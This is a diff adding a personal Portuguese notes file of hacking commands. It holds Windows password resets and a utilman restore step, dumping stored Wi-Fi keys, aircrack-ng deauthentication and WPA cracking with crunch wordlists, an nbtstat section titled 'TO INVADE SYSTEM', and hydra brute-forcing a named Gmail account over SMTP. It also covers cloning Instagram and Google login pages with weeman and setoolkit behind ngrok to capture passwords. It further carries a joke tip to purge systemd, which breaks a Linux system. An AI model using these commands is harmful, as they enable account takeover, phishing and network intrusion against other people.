@@ -1,0 +1,267 @@
+			
+					
+
+				USER
+control userpasswords2
+
+net user x *
+
+net user</ital> [nome de usuário] [nova senha]
+
+net user Administrador 123q456a
+
+net user
+
+
+					RESTAURAR UTILMAN
+
+cd Windows\System32
+
+del utilman.exe
+
+ren utilman.exe.bak utilman.exe 
+
+
+
+					LOCALIZAR IP windows
+
+Whois ip xxx-xxx-xxx
+
+cdnper.com -- tempo de resposta
+
+maxmind.com
+
+
+					WIFI
+
+conceitos:
+ssid= 	nome da sua conexão Wi-Fi
+bssid=	conjunto dos dados da rede
+key=	chave/senha
+mac=	id da rede
+MAC/IP=	usado o serviço ARP (Adress Resolution Protocol)
+
+
+netsh wlan show profiles key=clear		-descobrir a senha da rede conectada
+
+netsh wlan show drivers				-os drivers exatos que estão sendo utilizados e diversas outras informações importantes sobre o hardware usado.
+
+netsh wlan show wirelesscapabilities		-
+
+netsh wlan show interfaces			-SSID, BSSID, Cipher, o tipo de autenticação, o canal, média de recepção 
+		
+netsh wlan show interfaces name = "x"
+
+netsh wlan show network mode=bssid		- identificacoes das redes disponiveis
+
+netsh wlan connect name=IBBM
+			
+
+netsh wlan set hostednetwork mode=allow ssid="x" key="x"	-Para entrar em uma rede WiFi
+
+netsh wlan start hostednet			-Depois de conectado, para parar o acesso a rede Wi-Fi
+
+netsh wlan stop hostednetwork			-voltar a ter o acesso a rede Wi-Fi
+
+netstat -n
+
+
+netsh wlan set profileparameter name=”x” connectionmode=manual	-impedir que o computador se conecte automaticamente a diferentes redes
+
+
+
+					WIFI kali
+
+
+iwconfig 			- lista as interfaces de rede 
+
+airmon-ng start wlan0 		- coloca a placa de rede em modo de monitoramento
+
+iwconfig 			- lista o nome da placa de rede criada para monitoramento
+
+iwlist wlan0 scaning
+
+airodump-ng wlan0mon 		- lista todas as redes wireless ao alcance da placa de rede 
+
+airodump-ng -c "núemro do canal" --bssid "BSSID da rede" wlan0mon --ignore-negative-one 	-lista todos os dispositivos conectados no roteador
+
+aireplay-ng --deauth 0 -a "BSSID" -c "MAC do dispositivo" wlan0mon --ignore-negative-one 	-derruba a conexão do dispositivo conectado
+
+airmon-ng stop wlan0mon 	- tira a placa de rede do modo monitoramento
+
+
+
+iwconfig 			
+
+airmon-ng start wlan0mon		
+
+iwconfig 			
+
+iwlist wlan0 scanning
+
+airodump-ng wlan0mon --bssid {X} --channel {X} --Write senhawifi 
+abrir outra prompt
+airepaly-ng -0 100 -a {BSSID} -c {MAC} wlan0mon 
+dps parar aireplay e dps o airodump
+
+aircrack-ng {arquivo} -w wordList.lst
+crunch help
+crunch 8 10 ABCDEFGHIJKL1234 | aircrack-ng {arquivo} -w - -e {nomerede}
+@ = LETRA
+% = NUMERO
+
+@@@@
+combinacao de 4 letras
+
+https://www.youtube.com/watch?v=Nek7H3P8yww
+
+
+					SOLUCOES DE PROBLEMA KALI
+>arrumar o network do kali
+service network-manager restart 
+>kill processes
+airmon-ng check kill
+top / ps / pstree
+kill -l
+kill PID
+kill -9 PID force remove
+SIGKILL - end process brutal form
+SIGTERM - end proces 
+pidof ex:firefox
+
+Mensagem do dia: 90% dos problemas em GNU/Linux podem ser resolvidos com um único comando:
+# apt-get purge systemd* #para Debian-likes
+# dnf remove systemd* #para o Fedora
+# zypper remove systemd* #para o openSUSE
+https://sempreupdate.com.br/como-configurar-a-conexao-wifi-no-linux/
+
+
+					DESCOBRIR O MAC
+
+ping [endereço de IP da máquina a descobrir o MAC] [Enter]
+
+arp –a [Enter]
+
+Aqui fica um exemplo:
+
+C:\>ping 192.168.10.100
+
+C:\>arp -a
+
+Interface: 192.168.10.100 — 0x10004
+Internet Address Physical Address Type
+192.168.10.100 aa-fb-c8-34-da-7a dynamic
+
+					
+						TO INVADE SYSTEM
+
+nbtstat -c
+
+nbtstat –a IP.DA.VÍTIMA 
+
+xxx.xxx.xxx netbios (x = n° componente do IP)
+
+
+						FTP (ngrok)
+
+netstat -n
+ftp
+open
+ftp (nomeip)
+
+
+						WORDLIST
+
+https://www.youtube.com/watch?v=S3eBn0Y3g
+dQ&list=TLPQMTEwNjIwMjBjOynCnNpyPw&index=1
+
+1.cd Desktop
+2.mkdir {NomeDir}
+3.cd {NomeDir}/
+4.crunch --help
+5.crunch <min> <max> {Caracteres} -o {NomeWordlist.txt ou NomeWordlist.lst}
+/// 
+
+email
+hydra -S -l felipesugisawa1 -P /root/Desktop/{Arquivowordlist} -e ns -V -s 465 smtp.gmail.com smtp
+
+AaBbCcDdEeFfGgHhIiLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567890
+
+
+						CLONARSITE(weeman)
+https://www.youtube.com/watch?v=JXKe4KRejEs
+
+https://www.youtube.com/watch?v=Do7CqdKXrCY
+https://www.youtube.com/watch?v=dLx22jYFEfo 
+
+setoolkit
+
+Dowload >> https://github.com/evait-security/weeman
+Dowload >> https://ngrok.com/download
+descompactar>> unzip {NomeArquivo}
+mover >> sudo {Exemplo} /bin
+
+aplications/kali linux/exploration tools/Social engineering Toolkit/setoolkit
+y
+1
+2
+3
+2
+{EnderecoIp}
+{www.intagram.com}
+{colocar o ip no http//:}(pode usar o do pc)
+
+para aparecer a senha p vc
+file system/Var/www/
+						CLONARSITE(stoolkit)
+
+1
+2
+3
+2
+{IP}
+{https://www.google.com}
+
+
+						SERVIDORES DE GRACA
+
+https://profreehost.com/
+https://www.weblink.com.br/hospedagem-gratis
+000webhost
+FreeHosting
+GoogieHost
+5GB Free
+AwardSpace
+
+						OBTER UM SERVIDOR
+Instar Pacotes Essenciais
+sudo apt install build-essential
+
+Atualizar o Sistema Operacional
+sudo apt update
+
+Instalar o Banco de Dados MySQL
+sudo apt install mysql-client-5.7 mysql-client-core-5.7 mysql-common mysql-server-5.7 mysql-server-core-5.7
+
+Instalar o Gerenciador de Banco de Dados Workbench
+sudo apt install mysql-workbench mysql-workbench-data
+
+Instalar o Apache
+sudo apt-get install apache2
+
+Instalar o PHP 7.0
+sudo apt install php7.0 libapache2-mod-php7.0 php7.0-mcrypt php7.0-mysql
+
+Instalar o Python
+sudo apt-get install python-software-properties
+
+Ver a versão do PHP
+php -v
+
+Comando do arquivo index.php
+phpinfo();
+
+Iniciar o serviço PHP no terminal
+php -S localhost:8080
+						COMO ESCREVER ALGO NO SITE E ENVIAR PARA UM EMAIL
+						COMO MASCARAR UM IP COM NO IP COM REDE EXTERNA
